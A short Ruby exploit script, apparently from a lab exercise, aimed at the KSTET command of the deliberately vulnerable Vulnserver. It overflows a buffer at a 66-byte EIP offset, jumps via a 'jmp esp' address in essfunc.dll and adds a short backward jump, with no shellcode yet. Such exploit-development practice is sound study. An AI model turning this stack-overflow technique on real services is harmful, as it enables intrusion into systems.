#!/usr/bin/ruby
require 'socket'

target = '192.168.1.121'
port = 9999

#eip offset at 66
payload = "A" * 66
# 0x625011af : jmp esp |  {PAGE_EXECUTE_READ} [essfunc.dll] ASLR: False, Rebase: False, SafeSEH: False, OS: False, v-1.0- (C:\Documents and Settings\werebug\Desktop\Vulnserver\essfunc.dll)
payload += "\xaf\x11\x50\x62"
#nasm > jmp short -0x46
#00000000  EBB8              jmp short 0xffffffba
payload += "\xeb\xb8"
payload += "C" * 18

s = TCPSocket.open(target, port)
s.puts('KSTET /.:/' + payload)
s.close()
